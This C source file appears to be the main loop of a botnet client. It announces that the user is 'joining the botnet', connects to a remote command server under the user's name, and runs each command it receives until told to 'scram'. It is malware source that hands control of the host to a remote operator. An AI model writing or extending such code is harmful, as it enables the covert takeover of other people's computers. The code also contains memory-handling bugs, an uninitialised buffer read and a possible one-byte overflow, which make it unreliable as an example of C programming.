#include "bot.h"

int main(void){

	char* name = getenv("USER");
	int socket = init_channel(SERVER, PORT, name);
	char* msg = malloc(CMD_LENGTH);
	printf("%s joining the botnet\n", name);

	while(1){
		
		memset(msg, 0, strlen(msg)*sizeof(char)); //reset the msg buffer

		int recv_return = recv(socket, msg, CMD_LENGTH, 0);
		if(recv_return < 0){

			printf("reveive failed");

			return -1;
		}

		msg[recv_return] = '\0'; //add null terminator to end of msg.
		
		execute(msg, socket);

		printf("%s", msg);
        
        msg[5] = '\0';
        
        if(strcmp(msg, "scram") == 0){
            printf("closing client \n");
            return(0);
        }
	}	

	return(0);
}
